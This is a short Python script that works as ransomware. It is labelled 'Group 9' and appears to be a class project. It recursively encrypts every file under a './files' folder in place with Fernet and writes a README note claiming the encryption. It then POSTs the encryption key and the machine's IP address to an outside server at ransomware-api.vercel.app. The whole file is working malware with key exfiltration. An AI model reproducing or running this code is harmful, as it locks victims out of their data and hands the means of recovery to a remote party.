from cryptography.fernet import Fernet
import os
import glob
import urllib.request
import urllib.parse
import json
import socket


# ************************ ENCRIPTACION ******************************

def generate_key():
    key = Fernet.generate_key()
    return key


#items to encrypt
#our key
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)


def encrypt_files(key):
    path_to_encrypt = './files'
    full_path = glob.glob(path_to_encrypt+"/**", recursive=True)
    full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista

    encrypt(full_path, key)

    with open(path_to_encrypt + '/' + 'README.txt', 'w') as file:
        file.write('Files encrypted by Group 9\n')
    
    send_key(key)


        
def send_key(key):
    ip = socket.gethostbyname(socket.gethostname())
    data = {'key': key.decode('utf-8'), 'ip': str(ip)}
    data_json = json.dumps(data).encode('utf-8')

    req = urllib.request.Request('https://ransomware-api.vercel.app/encryption', data=data_json, method='POST')
    req.add_header('Content-Type', 'application/json')

    with urllib.request.urlopen(req, timeout=60) as response:
        response_data = response.read()
    
        print(response_data.decode('utf-8'))



